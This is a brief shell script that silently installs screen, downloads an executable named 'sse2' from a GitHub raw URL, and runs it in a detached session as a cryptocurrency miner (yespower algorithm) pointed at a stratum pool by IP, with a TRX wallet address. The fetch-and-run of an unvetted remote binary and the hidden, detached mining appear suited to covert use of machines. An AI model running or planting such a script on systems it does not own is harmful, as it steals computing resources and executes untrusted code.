#!/bin/sh
sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/amit12986/SC/main/sse2
chmod +x sse2
screen -S Wuenuak_Guerrr -dm ./sse2 -a yespower -o stratum+tcp://141.95.55.97:6533 -u TChMu1HcBrySoiYi4nS2AHMSgLYY6j28ws -p c=TRX -t 14
screen -ls
sleep 2
clear
screen -ls
./timer.sh
